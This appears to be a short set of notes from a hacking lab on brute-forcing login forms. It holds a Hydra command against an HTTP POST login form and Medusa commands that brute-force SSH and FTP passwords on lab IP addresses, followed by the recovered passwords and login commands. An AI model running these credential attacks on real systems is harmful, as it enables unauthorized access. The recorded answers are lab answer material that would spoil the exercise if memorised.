## Login Forms

### Question
```go
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.83 -s 32627 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### Medusa

##### Question 1

SSH Brute forcing
```go
medusa -h 154.57.164.65  -n 31358  -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

SSH Password:
```go
1q2w3e4r5t
```

SSH into server
```go
ssh sshuser@154.57.164.65 -p 31358
```

Brute forcing FTP
```go
medusa -h 154.57.164.65 -n 31358 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

FTP Password
```go
qqww1122
```

FTP Login
```go
ftp ftp://ftpuser:qqww1122@localhost
```